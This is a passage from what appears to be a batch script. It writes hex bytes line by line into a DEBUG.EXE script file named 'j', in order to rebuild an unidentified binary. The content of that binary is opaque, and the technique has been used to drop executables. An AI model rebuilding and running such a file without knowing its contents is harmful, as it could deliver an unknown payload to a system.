echo e 1AF0 6D 29 7B BD 4C 48 F4 F9 23 C3 F9 44 83 ED 52 FD>>j
echo e 1B00 8E 52 AC DE 56 06 7D 2B A4 32 C5 14 61 08 05 BD>>j
echo e 1B10 2A 39 D6 4D 9C 63 9F E1 F4 AC A1 18 B7 69 31 46>>j
echo e 1B20 A2 84 8E 52 7B 59 55 89 28 6A 25 B5 9D 93 77 94>>j
echo e 1B30 4F A5 75 46 20 B1 21 90 0C 93 83 56 D2 D4 88 94>>j
echo e 1B40 A2 AF 4C F4 AD B9 54 55 AF A1 D1 56 B2 49 34 71>>j
echo e 1B50 3F 65 BA 55 CF 96 45 48 B1 48 38 2A 73 5D 15 F8>>j
echo e 1B60 31 48 09 5E 7B D6 6C 9B D9 BA 00 0D 6B 09 5A 0D>>j
echo e 1B70 B6 18 69 B9 4B 52 84 51 EE 71 B9 7E 5E F5 25 C0>>j
echo e 1B80 8E 3E 51 07 E5 53 8B 49 49 1C E3 34 AD 63 37 4C>>j
echo e 1B90 56 71 9B A8 F5 3A 2B 50 83 7A BD 4C 62 A4 9C E3>>j
echo e 1BA0 AF 34 E8 D0 12 46 CC 8F A5 5D 7D 3A 73 2B 00 3A>>j
echo e 1BB0 73 9A 70 CC 36 E4 B0 19 C5 63 38 F2 49 79 98 F2>>j
echo e 1BC0 C6 2A F6 29 4F 6F 8C 7C 9B 47 D2 A3 DB 8C 00 2A>>j
echo e 1BD0 DB DC 99 95 41 ED 4C 30 BB F3 8A 2B A5 1B 58 E5>>j
echo e 1BE0 73 52 F7 99 6D BC A3 1E 30 33 8A AA 81 47 98 36>>j
echo e 1BF0 0F CA A4 5B 59 B7 7E 19 A7 45 0B B0 60 7A D1 4E>>j
echo e 1C00 31 6A F1 7A 9D 11 AC AA 59 58 A7 E5 82 38 1D 7A>>j
echo e 1C10 D4 B6 C7 7E A5 6C 3A 8D EA 31 4E 68 5C 29 18 EB>>j
echo e 1C20 4B 67 6E EB 7D 13 E7 EE BA 9A D6 2F DE F3 32 AD>>j
echo e 1C30 1B 69 63 BB B1 B1 FB 4D DC A8 90 82 40 07 18 AE>>j
echo e 1C40 AF C3 90 4B 6D 0C AB 22 6C 2C D8 C7 E3 58 BE 0C>>j
echo e 1C50 BA 59 35 AB 81 29 E8 9F D0 D7 67 12 6F 94 BA E3>>j
echo e 1C60 19 AD AA 55 6B 44 0A 77 56 65 D9 20 56 80 2B 00>>j
echo e 1C70 41 18 35 C1 FC 43 B5 82 DF 48 8F CB 40 87 A0 20>>j
echo e 1C80 62 BB EF 30 18 C8 F4 15 C4 7C 4B 46 93 C3 F1 C8>>j
echo e 1C90 A3 E5 42 33 58 4B 5D 59 85 F5 3C 86 EA 67 31 22>>j
echo e 1CA0 B3 12 C3 DE A8 79 8E 49 04 D4 D7 0E 24 91 71 E9>>j
echo e 1CB0 51 F0 5B 00 73 52 95 C7 26 EF A0 E4 18 21 89 EB>>j
echo e 1CC0 4E 7C 6E 04 1E 69 D2 43 FB B5 23 AD 44 14 81 9C>>j
echo e 1CD0 56 71 B5 F5 29 4B 95 D9 93 38 DC 32 2A C5 89 F2>>j
echo e 1CE0 EF 10 B8 E3 BD 55 8F 91 D7 A5 5C 2E A0 87 18 DC>>j
echo e 1CF0 2B 4B 24 BC 8E AA 2F ED 76 3A 0B 19 2D 94 48 C4>>j
echo e 1D00 03 CF 15 42 F2 66 2E 42 9C 0E F5 52 D2 ED 22 91>>j
echo e 1D10 CB F4 ED 57 36 0B 83 BD 47 06 BB 29 C9 46 9B 77>>j
echo e 1D20 3D 08 56 75 5A 68 A9 28 06 03 9E B8 AA F0 64 65>>j
echo e 1D30 5B 81 5B D7 7A 4B 41 64 66 7F 4E 2B 1A 18 5E 69>>j
echo e 1D40 B6 83 CD 65 1A B2 9B B5 89 AD 15 26 9F 63 16 F8>>j
echo e 1D50 7F A4 9A AB 5A DA 95 A1 49 C8 24 64 0F E9 59 24>>j
echo e 1D60 60 D4 4A 3C AE CC F1 31 11 E5 9B 2C 5B 85 E7 3E>>j
echo e 1D70 86 BD 0F C2 77 5E 5F 87 D5 03 74 73 91 F8 D7 9B>>j
echo e 1D80 23 60 D7 5B E1 DD 56 0B 3B 3D B3 77 27 15 8D 75>>j
echo e 1D90 78 2B 0E 9C 97 53 D5 75 58 5E E7 C2 EC 23 38 63>>j
echo e 1DA0 16 47 E5 5E 29 2D AD EE 98 EF 70 E3 6E 4F 24 1A>>j
echo e 1DB0 F7 18 EE 52 E7 42 84 28 C6 F8 C6 3F 2A F3 BF 1A>>j
echo e 1DC0 69 E6 0D 30 48 7A 96 FE A2 B4 85 AD A6 E2 72 E6>>j
echo e 1DD0 D8 E7 2D 27 92 F1 B7 CC E5 D8 F1 92 73 59 5A 92>>j
echo e 1DE0 32 5D C8 A7 B1 35 A9 A4 C2 DB 57 DC E2 A8 EA C8>>j
echo e 1DF0 63 BC 94 12 0F 27 A7 D6 A9 B8 ED 7D 4E CA EF F7>>j
echo e 1E00 29 19 80 95 E9 52 C6 A4 AE 7D F1 50 D4 F1 12 AB>>j
echo e 1E10 CF 4A 96 EC 70 53 DC 8C FC AF 9A B5 04 A4 8E BC>>j
echo e 1E20 D5 76 5D C7 22 A5 B7 8F 12 81 D8 D2 6B 99 1A D3>>j
echo e 1E30 BA 9D BA 17 96 E9 A2 3F 21 23 E8 6A 19 A5 33 64>>j
echo e 1E40 B1 C9 34 F6 87 68 A8 8A E3 9A 54 A1 17 73 B2 AC>>j
echo e 1E50 9A D0 AD E5 E0 F2 2A 64 DB B7 00 0A 26 62 23 E4>>j
echo e 1E60 54 31 B1 C1 A4 95 F7 39 53 50 95 89 E3 6D A7 24>>j
echo e 1E70 D5 A8 1C 35 C2 90 D5 9E EC 48 E2 A4 B0 24 DC A8>>j
echo e 1E80 CD 53 4B BE 86 D4 EB F2 C9 2B 1D 55 A0 49 1A 58>>j
echo e 1E90 DC 65 58 0C D5 73 A6 B4 4C 56 33 F2 67 22 8B 79>>j
echo e 1EA0 C8 59 48 5E 53 19 A1 F5 02 ED 91 C0 AE DC 3C 60>>j
echo e 1EB0 D6 FA 1D D5 AD 37 CD 62 6D 4E CC E9 66 15 40 C1>>j
echo e 1EC0 88 E7 EB 5E 91 A4 C7 1B 69 50 3C B9 C9 5F EB 4C>>j
echo e 1ED0 92 C6 DA EA 32 64 B6 47 65 39 52 54 12 0D 68 45>>j
echo e 1EE0 01 D8 A3 60 54 1D B1 5C 52 8F 23 D0 F2 A5 57 99>>j
echo e 1EF0 2B 98 DA BD A4 77 51 ED 56 60 54 D2 69 3A 64 76>>j
echo e 1F00 E8 57 D4 F3 9E A6 B6 55 61 96 6C 6C 19 03 1D 2A>>j
echo e 1F10 65 8A 34 6E 00 E2 A1 D9 3B 92 A2 A5 A9 0F D9 D3>>j
echo e 1F20 CA 62 C4 ED C7 22 B8 EB 48 0C 9A 93 A6 E2 06 E3>>j
echo e 1F30 82 7E B5 DA EC 77 2C 1B EE 9A AD 3E 9F 11 43 E5>>j
echo e 1F40 46 15 C9 EA 05 52 4D E8 CA 52 70 D0 CC BE B0 8C>>j
echo e 1F50 43 06 E7 24 E6 B9 9B 98 20 37 8E 5C 13 80 6B BF>>j
echo e 1F60 8E C3 78 4D CB BB 1E B5 CF 6A FA 76 DB 89 99 23>>j
echo e 1F70 1C 21 ED DF 15 B5 57 78 D9 02 A8 9E 87 2A 91 C3>>j
echo e 1F80 B6 5D BC 72 45 69 E9 16 90 48 37 3C 9D 2B 9C 8E>>j
echo e 1F90 79 63 96 60 E0 8C 31 C8 FC 6A E8 BD DB 1A 2C 7C>>j
echo e 1FA0 13 D7 15 14 A4 A4 F9 7A 95 EF 4B 62 1D 6A D5 21>>j
echo e 1FB0 D4 65 0A 49 52 49 FD 6B 24 91 9C 62 B5 88 92 79>>j
echo e 1FC0 8B 11 B9 A9 B7 76 2C B0 92 22 C3 75 14 28 F3 37>>j
echo e 1FD0 7E 84 28 B4 CC C2 80 E7 04 8C 54 0B CE 4F 5A B9>>j
echo e 1FE0 0C 6C CA 51 97 15 6A DE D1 1D 5B E4 E9 5C F2 77>>j
echo e 1FF0 D0 DA 14 D2 D1 94 A1 54 F3 54 81 C1 EB 57 5E 18>>j
echo e 2000 95 7E F6 37 52 C7 66 4C 9B 55 0E 4F 22 AC CD 61>>j
echo e 2010 31 85 48 8F 9E B9 AA 86 8F 63 67 4E 31 57 4C 85>>j
echo e 2020 12 3F 20 A8 35 A4 34 BB 6F B1 06 39 E4 7B 66 96>>j
echo e 2030 C6 CC B5 AE D7 8B 93 D7 15 76 48 59 15 94 8C 22>>j
echo e 2040 F4 AD E2 9E E8 E3 72 69 DC E7 52 C5 12 E0 B9 CE>>j
echo e 2050 07 41 5B 16 16 C2 42 D8 7D B8 ED 52 5A 08 9A 62>>j
echo e 2060 5C 02 00 A9 AE 5E 28 DB 7C 20 2E 7D 2B 3D 62 F5>>j
echo e 2070 2B DA 59 DC A4 C7 7D C2 A9 3D 1A B4 EE EE 57 EC>>j
echo e 2080 86 11 C5 62 F9 A1 A7 F7 CF 5A B8 70 CD 87 39 06>>j
echo e 2090 B6 9C B9 A2 9C 4D AA 4A DA A1 6C E7 4B 6C A3 1C>>j
echo e 20A0 E6 9D 71 A8 32 C8 76 B1 3B 86 31 E9 51 CB E4 C5>>j
echo e 20B0 CB 00 31 56 6C ED ED 6E A0 69 18 72 B9 3C 56 15>>j
echo e 20C0 52 A7 A9 29 F3 6C 8C C4 97 CA 63 33 92 D8 3C 52>>j
echo e 20D0 9D 4C 37 CD FC 55 1D C2 6E 66 54 3F 29 3C 55 37>>j
echo e 20E0 5D A3 08 99 38 E6 A1 34 CA 54 93 5C D2 35 54 9B>>j
echo e 20F0 90 24 66 3B 47 38 AB 90 6A 71 F9 6C 33 F7 47 15>>j
echo e 2100 8B 0C EE 91 EC 3D 31 CD 4C C9 1A D9 B3 AF 5A B6>>j
echo e 2110 A5 A2 68 D6 74 17 2A 65 99 E5 4B C0 5C 1F 98 0E>>j
echo e 2120 05 4F 0E 99 1C 90 AC AE E7 27 90 01 AC 56 2D 08>>j
echo e 2130 46 53 8C 8A B1 6F 79 3B 34 68 1C ED 0D EB 5D 15>>j
echo e 2140 A9 FB 9A 68 65 1B 59 F2 97 24 8F CB 56 20 72 2A>>j
echo e 2150 A4 D2 BC 72 01 ED 9A E9 9E CE 13 6D BC 9E DC 8A>>j
echo e 2160 C0 D5 12 28 A4 42 83 19 A9 C2 56 83 95 99 50 AA>>j
echo e 2170 DB F7 B7 1F 66 A2 76 F9 B8 CF 14 BA 86 8B 1C 56>>j
echo e 2180 4E E1 89 C7 35 15 AC C1 23 DE 0F 4A 7C BA 83 4B>>j
echo e 2190 0B A4 87 82 2A E5 0F 6B 27 AE C6 52 A9 27 3B 74>>j
echo e 21A0 30 52 14 20 F1 8E F4 FF 00 E2 C0 A5 94 2A 11 B0>>j
echo e 21B0 9C 53 37 2E 78 38 22 B8 27 AF BB D8 DA 2A 0B 46>>j
echo e 21C0 89 E7 94 DB AE E5 39 A8 AD 67 32 B3 13 D6 98 EE>>j
echo e 21D0 24 50 A4 E6 96 38 9D 5C EC 19 E2 AA 8A 71 D8 D1>>j
echo e 21E0 D3 87 3F 32 D8 B8 11 64 42 CF DB 81 49 0C 6A 2E>>j
echo e 21F0 47 04 02 45 4A 0A 0D 24 9E B2 67 FA D6 8B 43 11>>j
echo e 2200 4B 62 8A 37 B8 00 0F 7A EC C1 CD 73 36 D1 33 AB>>j
echo e 2210 15 2B 97 FC 3E 7E CF A8 5D 4A A4 9C A0 18 FC 0D>>j
echo e 2220 77 3A 0E A1 E7 5A B1 61 D0 E2 B9 CF 09 E9 CE 97>>j
echo e 2230 B7 42 78 B8 2B DF E8 6B 69 93 EC 4F E5 AA 05 56>>j
echo e 2240 39 C0 AC AB 2F 67 36 D9 C9 56 CA 5A 1D 04 38 77>>j
echo e 2250 71 9E 1A B9 BF 88 30 9F F8 46 E5 41 C8 15 BD A7>>j
echo e 2260 4C 8D F2 B1 1B 8F 4A A5 E2 DB 69 6F 34 A3 0C 48>>j
echo e 2270 59 98 8E 07 7A B9 4A 2E 37 44 4D 2B E8 7C F4 CA>>j
echo e 2280 50 F2 0F B5 31 72 49 61 5D 57 8A 74 89 AC A4 B7>>j
echo e 2290 26 10 81 94 02 31 DE B9 A6 85 84 84 01 DE B3 9C>>j
echo e 22A0 79 75 1C 63 D4 5F 34 90 01 ED 42 C9 90 46 3A D2>>j
echo e 22B0 0D A4 10 47 34 8E BB 08 E7 9A C6 C8 BB 5F 56 49>>j
echo e 22C0 E5 86 39 14 A4 F9 4A DD F2 29 D1 B2 88 FD E9 92>>j
echo e 22D0 46 ED CE 3A D5 6B A2 66 CD 5A 3A 0D 59 37 29 1E>>j
echo e 22E0 82 AE DB EA 6F 02 22 60 11 EF FF 00 EB AA 71 C2>>j
echo e 22F0 40 24 F1 48 D1 1C 29 C7 4E F5 BD 48 BE 43 38 4A>>j
echo e 2300 51 F7 A2 76 F7 77 46 F3 4E 09 EC 3A 56 51 B7 FB>>j
echo e 2310 28 59 30 55 8F 02 97 42 9C 7F 69 45 14 A4 32 37>>j
echo e 2320 63 5B 3E 26 58 CC 71 79 47 24 71 C7 6A 58 5C 44>>j
echo e 2330 53 51 96 E7 5A AB CD AA DC E2 F5 26 32 5C B1 CE>>j
echo e 2340 4E 39 FC AB 0D BE F1 AD CB 98 88 9C 83 D7 15 8D>>j
echo e 2350 20 F9 CF D6 AA A4 B9 A6 CE 0C 4B 72 95 C6 2E 33>>j
echo e 2360 CD 58 13 62 24 45 FE 12 4D 57 C1 14 F1 8C 0A 87>>j
echo e 2370 A9 84 4F 49 D2 FC 4D 72 6D 2C ED 93 05 55 40 6F>>j
echo e 2380 5E 94 CF 17 EA 26 EF 4D 28 C0 05 18 C6 3D 6B 91>>j
echo e 2390 B2 7B 8B 67 89 D7 2A 84 F5 AD 5D 42 EA 3B 9B 56>>j
echo e 23A0 42 F9 24 F0 2A 52 77 D0 EA 8C 12 43 34 A7 8D 60>>j
echo e 23B0 0C FF 00 7B B5 61 EA 2D E6 5E 4E 73 C6 F3 5B 10>>j
echo e 23C0 42 7C A5 2B D3 1D AB 1A EC 01 34 C0 0E 77 1A BA>>j
echo e 23D0 71 BB 6E C5 D7 4F 95 5D E8 52 2A 00 04 54 A4 83>>j
echo e 23E0 1F 4A 80 65 8E 2A 55 53 8C 1F A5 43 D0 E4 8B EC>>j
echo e 23F0 37 CC C7 14 A2 66 04 7B 53 1C 61 88 F4 A6 D5 DC>>j
echo e 2400 9E 76 99 A3 1C A5 A2 39 39 A9 02 86 8C 1C 56 6A>>j
echo e 2410 C8 C0 60 74 AD 08 CF FA 38 CF 5A CE 6B 97 54 77>>j
echo e 2420 50 AA A5 BF 41 27 88 6C C9 35 53 EE 70 3A 54 D2>>j
echo e 2430 B9 20 F3 50 29 0D 9C 9A 98 DD EE 45 67 07 2D 0D>>j
echo e 2440 1B 4B 34 9A DC B1 C8 35 4C 03 6D 73 95 EC 6B 62>>j
echo e 2450 C6 26 FB 18 6C 70 6A 27 B7 1E 6E 59 78 A2 ED 68>>j
echo e 2460 D6 8C EE 9E 11 4A 94 65 1D C6 5B 6A 0E 0C 80 A8>>j
echo e 2470 C3 8E 72 2A EC 16 A6 58 43 E4 0C D5 4D 89 E6 1D>>j
echo e 2480 A0 1A D2 B7 6D B0 A8 07 15 E8 C6 93 E4 43 A1 06>>j
echo e 2490 D5 9B 3D 4F 46 B8 13 44 ED 8E 33 57 A5 BB 58 C1>>j
echo e 24A0 5F 4A C6 D3 D8 5B 65 17 EE 93 9A 75 C3 EE 95 CE>>j
echo e 24B0 6B 89 2B BB C8 F2 3A 16 AD DC 79 CC E3 F2 A2 E2>>j
echo e 24C0 E0 A4 87 D4 D5 5B 06 2D 73 8C F1 56 35 38 C0 28>>j
echo e 24D0 C3 A9 15 2D 26 C3 54 AE 89 A2 BB 5C 00 4F 34 79>>j
echo e 24E0 AC 24 20 1E 0D 63 99 0A 9C 56 85 9B 19 48 46 EF>>j
echo e 24F0 4D B6 9D C3 9B 4D 4D 8B 42 F9 C0 22 A8 DE DB B3>>j
echo e 2500 4F 29 6C 63 69 EB 56 D1 0C 32 28 CF 18 A9 65 86>>j
echo e 2510 3B A0 C4 B6 38 E7 14 F9 B9 91 14 F5 7A 9E 67 7F>>j
echo e 2520 A1 5C 3C 92 95 D9 B5 9C 9C 8F AD 66 47 A7 5D 41>>j
echo e 2530 36 1C 02 BD 8D 7A 5C BA 74 49 03 E0 93 93 58 BA>>j
echo e 2540 AD 9C 50 DB C6 50 12 73 58 B8 B4 EE 8D D3 94 5F>>j
echo e 2550 BA 73 29 1F D9 DB 2C 79 F4 A8 AE AE 5E 78 5E 34>>j
echo e 2560 EB D2 B7 86 9D 6D 32 87 91 8A B6 DE 6B 1A EA DA>>j
echo e 2570 08 1F 74 2E 5B 9E F5 D1 EC E4 A2 9F 70 E6 72 D6>>j
echo e 2580 25 1F B2 4B 14 0A C4 8C 9E DD EA E5 AC 32 EC CF>>j
echo e 2590 03 EB 49 81 33 72 49 02 A6 8F 28 FB 46 71 49 C6>>j
echo e 25A0 2B D4 DF 95 DB 52 58 E3 11 38 63 D5 7A 9A B4 D7>>j
echo e 25B0 68 EB B5 6A 04 43 32 30 27 19 A7 C9 67 15 BC 21>>j
echo e 25C0 C1 25 BD E8 4E CB 43 35 16 D3 4B 62 CD BB 15 E5>>j
echo e 25D0 B0 31 D2 9F 79 32 C9 03 A2 FA 63 35 9E 93 EF 4F>>j
echo e 25E0 71 57 4E D8 EC DD C8 E7 15 70 AD CB 1E 53 9A B7>>j
echo e 25F0 36 91 47 3D BE 48 97 70 38 15 2A 4C F2 2F 3C 9A>>j
echo e 2600 82 EA ED 5A DB 60 5C 11 DE AB 5B 5E 18 88 C8 CD>>j
echo e 2610 61 2F 79 9B 7B 3B 47 52 59 18 C7 2F CC 3A 9C D5>>j
echo e 2620 95 9F CC 55 00 9E 4F 4A A3 30 79 5C B0 27 07 A5>>j
echo e 2630 4B 0C 6F 03 0C E4 90 2A 69 C6 5C CE 2C A9 39 2B>>j
echo e 2640 73 12 DF 2B 49 26 14 E4 01 CD 5F B0 9A 38 6D 0A>>j
echo e 2650 67 0C 54 8C 55 7B 5B 57 B8 57 66 38 C1 EF 5A 0B>>j
echo e 2660 A5 62 35 73 D5 79 E2 B4 71 52 F8 99 AD 3E 6D D9>>j
echo e 2670 92 F0 BA 38 95 CE 13 75 5D 02 D9 C1 20 E0 62 AB>>j
echo e 2680 DF 5C 79 9B A3 DB D3 8A 2C A2 33 00 81 4F A5 45>>j
echo e 2690 A3 7D 0D 65 42 7C AE E2 BD A9 95 89 8C F1 8E B4>>j
echo e 26A0 B2 DA 49 1C 3B 7A 86 E2 B6 52 C9 AD 61 04 8C FA>>j
echo e 26B0 53 24 B8 46 28 8C 9F 74 F3 C5 55 4A 8E E9 98 F3>>j
echo e 26C0 D4 8A B3 31 FF 00 B1 AE 24 45 72 DC 01 8C 7A 55>>j
echo e 26D0 63 1F 91 72 89 E9 80 4D 74 92 EA 02 20 00 8F 2B>>j
echo e 26E0 5C E5 DC 86 69 9D F1 B4 93 C7 E7 57 2A CE 4B 53>>j
echo e 26F0 2C 2A A9 39 37 D0 E9 E2 95 25 8B 6A B8 22 B1 F5>>j
echo e 2700 D4 32 14 28 9B 70 29 B6 71 CF 03 2C 84 9D BD 6A>>j
echo e 2710 F5 DC E1 D5 49 4C F1 9A E6 74 DA D6 25 4E 32 83>>j
echo e 2720 BA 31 A0 B5 96 54 1B 18 7B 83 53 DC D9 C9 F6 52>>j
echo e 2730 14 0E 95 72 DA 13 83 28 07 D7 14 F3 36 F8 7A 02>>j
echo e 2740 6B A1 29 5B 42 21 CD 26 F9 4E 7A 1B 57 0D 97 E7>>j
echo e 2750 D6 A1 BA 42 AE 48 18 AD 3B A9 CC 12 00 14 73 55>>j
echo e 2760 58 1B B8 9D 94 7C C0 D4 4E 10 4B 57 A9 D5 08 B7>>j
echo e 2770 1F 33 32 32 C5 C0 C5 6A C2 CE 22 62 AB 93 8A A7>>j
echo e 2780 02 13 70 06 39 1C 56 85 B1 21 66 C8 C1 C5 3A 72>>j
echo e 2790 E5 4F 94 B5 4D F2 B2 A0 7C 27 27 9C F2 2B 46 0B>>j
echo e 27A0 90 75 4B 44 CF CA 19 7F A5 67 34 39 45 7C F5 38>>j
echo e 27B0 35 72 28 02 EB 10 60 9E AA 6A E9 D4 71 F7 5F 53>>j
echo e 27C0 CC C4 4A 5A 46 3B 9E C7 A4 08 77 B9 00 6E 09 93>>j
echo e 27D0 F9 56 76 B1 B9 A6 0D 1F 20 52 F8 65 DA E2 F2 E0>>j
echo e 27E0 1E 81 31 FA 1A 76 A0 36 33 28 35 33 F7 99 A3 84>>j
echo e 27F0 AD 67 B9 57 4D 9D FE D4 99 3D 0E 2B B0 55 12 28>>j
echo e 2800 38 04 8A E5 20 B5 11 B0 94 1C 1E 0D 75 3A 74 81>>j
echo e 2810 E0 07 B9 EB 49 27 7B 19 BB C7 46 79 CF C4 9B 7F>>j
echo e 2820 F4 8B 77 04 6E E8 3F 5A F3 56 52 AF 28 71 82 09>>j
echo e 2830 AF 69 F1 56 90 BA A5 EC 41 DB 01 06 71 F9 D7 8F>>j
echo e 2840 EB 16 E6 DB 53 BA 88 1F B8 CC 3F 5A 7C BC CD F3>>j
echo e 2850 3D 0E CA 2F DC B3 31 FA 1D C4 71 43 9F 33 90 29>>j
echo e 2860 84 9C 85 27 8A B7 6B 1A BC 6E 7D 2B 39 25 BA 08>>j
echo e 2870 C7 9D D8 AE B1 38 00 E7 8C 55 B5 99 59 55 40 E4>>j
echo e 2880 53 1C ED F9 47 D2 A3 55 DB 26 6A A5 27 A3 2F DE>>j
echo e 2890 A7 B1 2B 36 72 00 A4 69 42 C6 AA 47 34 C5 94 26>>j
echo e 28A0 E3 8C D5 9F 20 CB 0A 3E DE 4D 69 2A CE 51 39 69>>j
echo e 28B0 39 CE 6D F4 2C E9 AE 0D E4 4E 3A 8A D7 9A 4F 3D>>j
echo e 28C0 B1 9E 86 AA 45 62 91 48 24 04 E7 1D 29 1E 63 1C>>j
echo e 28D0 C4 63 A5 71 7B 26 E5 CF 0D 91 E8 54 A3 3A 74 F9>>j
echo e 28E0 FB 99 D7 50 34 97 CE 54 E4 01 9F D2 B0 A7 5C 4C>>j
echo e 28F0 D8 1C 66 BA 11 37 EF 9F 1D 4D 62 DC A9 13 30 3E>>j
echo e 2900 B5 DA A2 D4 53 3C FA 9A A4 53 3D 68 C7 A5 29 18>>j
echo e 2910 34 94 8C AC 74 0B 73 14 D6 11 C0 0A F9 98 FC 69>>j
echo e 2920 34 ED 22 E6 EE E4 C6 C7 0A 01 26 B2 6C B9 BC 88>>j
echo e 2930 7B 8A F4 6F 08 C1 1D CE BB 2C 52 0C 8D 9F D0 D1>>j
echo e 2940 15 6D 51 B4 75 57 30 E2 55 B0 9C 41 2B 02 08 CD>>j
echo e 2950 73 BA 84 A9 F6 D9 F6 74 62 6B AE F1 9D 84 56 BA>>j
echo e 2960 DA AA 64 29 5E 00 FC 6B 86 BA 01 2E 1D 47 66 35>>j
echo e 2970 50 A8 D5 D0 AB 49 D9 11 C7 F2 C8 32 2A C9 C1 93>>j
echo e 2980 03 A7 5A AF B8 16 1F AD 48 64 00 9F D2 A2 5A 93>>j
echo e 2990 1B 72 D9 8D 91 77 48 7D E8 F2 CC 6A 49 EE 29 9E>>j
echo e 29A0 61 1F 9E 68 69 99 B8 34 24 C8 BA 19 D0 D5 C5 90>>j
echo e 29B0 34 4B ED 55 00 DD 56 04 7B 63 53 93 CD 36 93 2E>>j
echo e 29C0 95 D5 EC 23 F2 D5 01 E0 D4 E7 AD 42 E3 E6 A4 AC>>j
echo e 29D0 B6 1D 45 D4 E8 74 FB A5 5D 3D 50 F5 3D 2A C4 F1>>j
echo e 29E0 96 8B F0 AC FB 38 D7 EC C8 6B 44 C8 59 42 9F 4A>>j
echo e 29F0 CA B5 59 DD 76 3D DA 1C D1 A2 99 98 11 A1 25 8F>>j
echo e 2A00 43 56 12 E5 76 0A 95 61 F3 55 B3 D1 6A A4 90 6D>>j
echo e 2A10 72 07 4A EA 8E 2E 52 8E 87 95 49 57 94 9B 8E C7>>j
echo e 2A20 B2 BD B8 82 DD 58 8C 1C D5 79 8A 08 F2 08 DC 45>>j
echo e 2A30 69 EA 24 49 0A AE 46 73 5C EC C5 92 62 A4 FB 54>>j
echo e 2A40 2D 8E 35 2F 74 9A 29 0C 4F B9 4F 35 66 4B 83 2C>>j
echo e 2A50 7F 39 C9 1D 2A 09 2D A4 81 55 88 F9 4F 7A 68 E6>>j
echo e 2A60 95 C5 77 B0 AB 10 94 13 D3 15 34 0E D1 4E 08 E3>>j
echo e 2A70 6D 4B 04 27 CB DE 07 02 AB 5C 36 73 B3 96 34 6E>>j
echo e 2A80 68 E2 AC 5A 7B D9 5C E0 B0 E3 26 AC DB 5C AE DC>>j
echo e 2A90 B3 61 AB 0E 3B 69 A5 93 AE 2B 41 23 58 FE 49 0E>>j
echo e 2AA0 48 A1 59 68 47 32 8E EC D0 FB 40 28 D9 1C 1E 6A>>j
echo e 2AB0 BD CC 29 34 48 76 FB E2 A8 49 70 55 B6 83 C0 3C>>j
echo e 2AC0 55 D8 EF 13 6A 06 20 52 EB 62 B9 EE 61 CF 04 ED>>j
echo e 2AD0 3B A0 46 00 E7 1F 4A A2 DA 64 85 08 64 38 15 DA>>j
echo e 2AE0 43 6E 2E 25 25 30 46 3A D5 3B C8 87 95 22 82 37>>j
echo e 2AF0 0A 6A 5A 8D D4 6A 49 1C A4 36 CA 84 AA A6 58 F6>>j
echo e 2B00 AA F7 08 62 B8 C6 08 3D F3 5B 48 05 B1 12 C9 C3>>j
echo e 2B10 67 A5 64 EA 73 AC 9A 86 EC 80 08 CD 13 96 BB 1B>>j
echo e 2B20 F3 5A 57 21 82 52 66 C6 78 AB F7 52 44 B6 E4 13>>j
echo e 2B30 CE 33 59 31 47 99 59 81 E9 CE 69 B7 32 AE CC EE>>j
echo e 2B40 DD CF 3C D2 BE BA 95 4E A2 45 EB 3B 98 61 52 49>>j
echo e 2B50 5D C2 AA DD 6A 6C D1 BA 03 D7 D2 A8 4F 22 3B E5>>j
echo e 2B60 4F 15 02 46 BE 66 E6 62 79 A7 E6 27 C8 E5 72 34>>j
echo e 2B70 0C D2 E5 FE EF BD 69 C3 6B 16 E0 DC 73 55 E7 31>>j
echo e 2B80 B2 2A A9 E3 D6 92 3B B8 E2 70 BB 89 A9 9B 4A 37>>j
echo e 2B90 25 D5 8B D1 32 C4 D1 7F A4 6D 46 C6 29 63 57 7B>>j
echo e 2BA0 85 72 78 1D 6A A3 3B 35 C3 38 39 1D 6A 68 EE E3>>j
echo e 2BB0 0E 06 73 9A 88 49 4A 3D 8E 8B 29 42 ED 9B 50 2A>>j
echo e 2BC0 1C E1 80 CF 5A 7C D7 AF 18 74 F3 06 00 C5 62 1B>>j
echo e 2BD0 9D B2 7C A4 E2 A3 77 2E C7 24 80 79 AD 53 E5 4E>>j
echo e 2BE0 FA A3 0A 32 94 B5 B6 82 B1 2F 31 27 91 56 63 B9>>j
echo e 2BF0 6B 5E 01 03 38 34 D8 84 05 46 18 FA 55 3D 50 08>>j
echo e 2C00 E4 45 47 CF 1C D7 3A A8 DE 96 B1 DC EB EB 66 8D>>j
echo e 2C10 29 B5 89 9F 83 F8 54 03 50 9D 23 62 47 27 9C D4>>j
echo e 2C20 36 90 47 32 2B 33 90 47 6A BD 38 B4 16 A5 37 0D>>j
echo e 2C30 E7 BD 68 AC F4 32 9D 58 5B 62 92 DF CB 32 FC C4>>j
echo e 2C40 7A 0A 6E 58 E0 9E 4D 53 9D 7C 9C 04 6C E6 AE C5>>j
echo e 2C50 1A 35 BA 93 27 CD DE B4 49 45 72 B2 3E B3 4E 9A>>j
echo e 2C60 D0 98 5F 4A 10 AE 70 3A 0F 6A 43 71 30 55 0C DD>>j
echo e 2C70 3A 55 58 D9 16 E7 E7 7C A8 35 6E 70 93 6D 08 31>>j
echo e 2C80 81 59 39 3F 68 97 43 1F 6E A5 A1 2A DD CE 88 4A>>j
echo e 2C90 F2 0F 15 98 97 37 02 51 C9 DA 6B 4A 20 8B 18 8C>>j
echo e 2CA0 9C 93 51 CF 0B A6 78 C6 0F 35 4B E2 BD FE 44 D4>>j
echo e 2CB0 A8 D4 92 8E 85 69 9F CE 03 71 E4 55 44 9D A1 91>>j
echo e 2CC0 91 4F CA 6A 59 63 74 93 6B 63 27 9E 29 82 C2 49>>j
echo e 2CD0 01 91 33 F4 A7 52 A4 5E 8D 6A 6F 2E 67 1D 37 23>>j
echo e 2CE0 8C 94 B8 0C 0F 53 57 95 8A C6 E7 3C 9A 63 E8 F7>>j
echo e 2CF0 30 BA B9 00 A8 E6 99 33 18 C1 0C 70 0F 4A 94 D8>>j
echo e 2D00 E8 CE D1 6A 44 12 34 9E 58 1C 80 4F F5 AE 9A DF>>j
echo e 2D10 4F 63 79 6B 2E 41 C0 52 7F 21 5C D1 95 0C 08 33>>j
echo e 2D20 C8 27 F9 D7 57 6F 7F 01 16 EA AE 06 17 04 67 E9>>j
echo e 2D30 5A 5B 54 FB 18 49 C6 F7 3B 9F 08 C9 19 BB B9 F9>>j
echo e 2D40 86 70 41 FC 8D 69 6A 36 99 46 91 70 7B E6 B9 9F>>j
echo e 2D50 0B 5E DA DB 5C CE 65 6C 06 04 03 F9 D7 63 67 3D>>j
echo e 2D60 A5 E6 9F 21 89 89 50 D8 24 D5 4E DB A3 29 D6 82>>j
